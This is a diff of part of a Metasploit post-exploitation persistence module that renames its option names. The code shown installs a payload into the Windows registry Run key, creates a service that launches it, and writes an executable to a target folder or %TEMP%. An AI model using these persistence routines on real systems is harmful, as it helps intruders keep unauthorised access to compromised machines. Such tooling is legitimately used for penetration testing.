@@ -131,7 +131,7 @@ class MetasploitModule < Msf::Post
   # Function to install payload in to the registry HKLM or HKCU
   #-------------------------------------------------------------------------------
   def write_to_reg(key, script_on_target)
-    nam = datastore['STARTUP_NAME'] || Rex::Text.rand_text_alpha(rand(8) + 8)
+    nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
     print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
     if key
       registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, "REG_SZ")
@@ -146,8 +146,8 @@ class MetasploitModule < Msf::Post
   def install_as_service(script_on_target)
     if  is_system? || is_admin?
       print_status("Installing as service..")
-      nam = datastore['STARTUP_NAME'] || Rex::Text.rand_text_alpha(rand(8) + 8)
-      description = datastore['SERVICE_DESC'] || Rex::Text.rand_text_alpha(8)
+      nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
+      description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
       print_status("Creating service #{nam}")
 
       key = service_create(nam, :path=>"cmd /c \"#{script_on_target}\"",:display=>description)
@@ -170,20 +170,20 @@ class MetasploitModule < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(rexe, rexename)
-    if not datastore['LEXEPATH'].nil?
+    if not datastore['LocalExePath'].nil?
     # check we have write permissions
     # I made it by myself because the function filestat.writable? was not implemented yet.
-      testfile = datastore['LEXEPATH'] + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
+      testfile = datastore['LocalExePath'] + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
       fd = session.fs.file.new(testfile,"w")
       if fd
         fd.close
         session.fs.file.rm(testfile)
-        tempdir = datastore['LEXEPATH']
+        tempdir = datastore['LocalExePath']
       else
-        print_warning("Insufficient privileges to write in  #{datastore['LEXEPATH']}")
+        print_warning("Insufficient privileges to write in  #{datastore['LocalExePath']}")
       end
 
-    # Write to %temp% directory if not writable or not set LEXEPATH
+    # Write to %temp% directory if not writable or not set LocalExePath
     else
       tempdir = session.fs.file.expand_path("%TEMP%")
     end
